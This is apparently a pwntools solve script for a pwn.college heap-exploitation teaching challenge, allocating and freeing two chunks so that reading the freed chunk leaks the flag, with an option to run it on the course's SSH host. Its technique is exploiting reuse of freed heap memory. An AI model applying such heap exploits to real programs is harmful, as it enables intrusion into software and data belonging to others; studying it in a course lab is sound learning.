#!/usr/bin/python3
from pwn import *
import sys

cokgizliparolam = ""


try:
    arg = sys.argv[1]
except:
    arg = "yok"

print("""
            ###             ###
            ###             ###
            ###             ###
            ###     ###     ###
            ###     ###     ###
            ###     ###     ###
            ###     ###     ###
            ###     ###     ###
            ###     ###     ###
            ###     ###     ###
            ###     ###     ###
            ###     ###     ###
            ###     ###     ###
            ###     ###     ###
    ####################################
    ####################################
            ###     ###     ###
            ###     ###     ###
            ###     ###     ###
        ###########################
        ###########################
            ###     ###     ###
            ###     ###     ###
            ###     ###     ###
                    ###
                    ###
                    ###
                    ###
""")


isim = "./babyheap_level3_teaching1"
context.arch = "amd64"

if arg == "remote":
    con = ssh(user="cse466", host="cse466.pwn.college",password=cokgizliparolam, keyfile="~/.ssh/id_rsa")
    p = con.process(isim)
else:
    p = process(isim)


if arg == "debug":
    script = ""
    pid = gdb.attach(p.pid,script)

def malloc(index, size):
    p.sendline("malloc")
    p.read()
    p.sendline(str(index))
    p.read()
    p.sendline(str(size))
    p.read()

def free(index):
    p.sendline("free")
    p.read()
    p.sendline(str(index))
    p.read()

def readf():
    p.sendline("read_flag")
    p.read()

def put(index):
    p.sendline("puts")
    p.read()
    p.sendline(str(index))
    oku = p.recvuntil(b"Data: ")
    return p.readline().rstrip().decode()


p.read()

malloc(0,389)
malloc(1,389)
free(0)
free(1)
readf()
flag = put(0)
print(f"Flag is: {flag}")
